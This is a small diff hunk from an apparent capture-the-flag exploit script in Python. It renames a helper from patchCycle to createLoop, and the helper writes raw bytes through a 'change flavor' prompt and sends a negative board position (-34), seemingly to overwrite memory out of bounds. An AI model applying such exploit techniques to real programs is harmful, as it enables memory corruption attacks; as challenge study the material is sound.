@@ -30,7 +30,7 @@ def changeFlavor(content):
 def playerMove(pos):
     io.sendlineafter("(9 to change flavor): ", str(pos))
 
-def patchCycle():
+def createLoop():
     changeFlavor("\x46")
     playerMove(-34)
     changeFlavor("\x8C")
